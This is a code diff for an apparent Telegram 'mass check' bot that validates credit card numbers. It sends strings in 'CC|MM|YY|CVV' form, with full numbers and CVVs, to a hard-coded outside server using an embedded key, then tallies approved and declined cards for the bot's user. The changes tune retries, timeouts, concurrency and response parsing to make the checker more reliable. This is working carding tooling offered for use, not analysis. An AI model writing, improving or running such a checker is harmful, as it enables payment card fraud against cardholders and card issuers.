@@ -1436,45 +1436,34 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 
 def parse_api_response(raw_text):
     """
-    Safely parse API response, handling extra data by extracting the first valid JSON.
+    Safely parse API response, handling extra data or empty responses.
     """
     raw_text = raw_text.strip()
     if not raw_text:
-        raise ValueError("Empty response")
-    try:
-        return json.loads(raw_text)
-    except json.JSONDecodeError as e:
-        # Use regex to find the first valid JSON object
-        # This handles cases where extra text or another JSON object is present
+        raise ValueError("Empty response or no data received")
+    
+    # Check for "Expecting value" error cause (empty response)
+    if not raw_text.startswith('{'):
         match = re.search(r'\{.*?\}', raw_text, re.DOTALL)
         if match:
-            try:
-                # Attempt to load the extracted part
-                return json.loads(match.group(0))
-            except json.JSONDecodeError:
-                # If the extracted part is still invalid, raise the original error
-                raise e
+            raw_text = match.group(0)
         else:
             raise ValueError(f"Invalid JSON: No JSON object found in response.")
 
+    try:
+        return json.loads(raw_text)
+    except json.JSONDecodeError as e:
+        # Re-raise the error with a more specific message if it's still un-parsable
+        raise ValueError(f"Failed to parse JSON after cleanup: {e}")
+
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time):
-    """
-    Asynchronously checks a list of credit cards against an API.
-    
-    Args:
-        cards_to_check (list): A list of credit card strings in the format "CC|MM|YY|CVV".
-        user_id (int): Telegram user ID.
-        user_first_name (str): Telegram user's first name.
-        processing_msg (telegram.Message): The message object to edit with status updates.
-        start_time (float): The timestamp when processing began.
-    """
     approved_count = declined_count = checked_count = error_count = 0
     results = []
     total_cards = len(cards_to_check)
-    update_interval = 3  # seconds
+    update_interval = 3
     last_update = time.time()
     
-    semaphore = asyncio.Semaphore(10) # Limit concurrent requests to prevent overload
+    semaphore = asyncio.Semaphore(3)
 
     async def check_card(session, raw):
         nonlocal approved_count, declined_count, checked_count, error_count
@@ -1485,34 +1474,31 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             error_count += 1
             return {"status": f"❌ Invalid card format: `{raw}`", "card": raw}
 
-        # Normalize year (2-digit) and format card string for URL
         cc_normalized = f"{parts[0]}|{parts[1]}|{parts[2][-2:]}|{parts[3]}"
         api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
 
-        max_retries = 3
+        max_retries = 3 # Reduced retries, longer timeout is primary fix
         
         async with semaphore:
             for attempt in range(max_retries):
                 try:
-                    # Small random delay to prevent API overload
                     await asyncio.sleep(random.uniform(0.1, 0.4))
-
-                    async with session.get(api_url, timeout=30) as resp:
-                        if resp.status != 200:
-                            raise aiohttp.ClientError(f"HTTP Error {resp.status}")
-                        
+                    
+                    # Set a 40-second timeout for the request
+                    async with session.get(api_url, timeout=40) as resp:
                         raw_text = await resp.text()
+                        
+                        # Use the improved parsing function
                         data = parse_api_response(raw_text)
                         
-                        # Process response
                         api_status = data.get("status", "Unknown")
                         
                         if "approved" in api_status.lower():
                             approved_count += 1
-                            result_status = f"✅ Card Approved: {api_status}"
-                        elif "declined" in api_status.lower() or "incorrect" in api_status.lower():
+                            result_status = api_status
+                        elif "declined" in api_status.lower() or "incorrect" in api_status.lower() or "expired" in api_status.lower():
                             declined_count += 1
-                            result_status = f"❌ Card Declined: {api_status}"
+                            result_status = api_status
                         else:
                             error_count += 1
                             result_status = f"⚠️ Unknown Status: {api_status}"
@@ -1521,16 +1507,16 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                         checked_count += 1
                         return {"status": result_status, "card": cc_normalized}
 
-                except (aiohttp.ClientError, asyncio.TimeoutError, ValueError, json.JSONDecodeError) as e:
+                except (asyncio.TimeoutError, aiohttp.ClientError, ValueError, json.JSONDecodeError) as e:
                     logging.error(f"Attempt {attempt + 1}/{max_retries} failed for card {cc_normalized}: {e}")
                     if attempt < max_retries - 1:
-                        await asyncio.sleep(random.uniform(2, 5))
+                        await asyncio.sleep(random.uniform(5, 10))
                     else:
                         checked_count += 1
                         error_count += 1
                         return {"status": f"❌ API Error: {escape_markdown(str(e), version=2)}", "card": cc_normalized}
 
-    # Main coroutine execution
+    # Main coroutine execution (rest of the code remains the same)
     async with aiohttp.ClientSession() as session:
         tasks = [check_card(session, raw) for raw in cards_to_check]
         
@@ -1538,7 +1524,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
             result_dict = await coro
             results.append(result_dict)
 
-            # Periodic update for user feedback
             if time.time() - last_update >= update_interval:
                 last_update = time.time()
                 current_summary = (
@@ -1551,7 +1536,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     f"\n𝗠𝗮𝐬𝐬 𝗖𝗵𝗲𝗰𝗸\n──────── ⸙ ─────────"
                 )
                 
-                # Format each result for Telegram markdown
                 result_text = []
                 for res in results:
                     safe_card = escape_markdown(res['card'], version=2)
@@ -1566,7 +1550,6 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                 except Exception as e:
                     logging.error(f"Failed to update Telegram message: {e}")
 
-    # Final summary update
     final_time_taken = round(time.time() - start_time, 2)
     final_summary = (
         f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total_cards}\n"
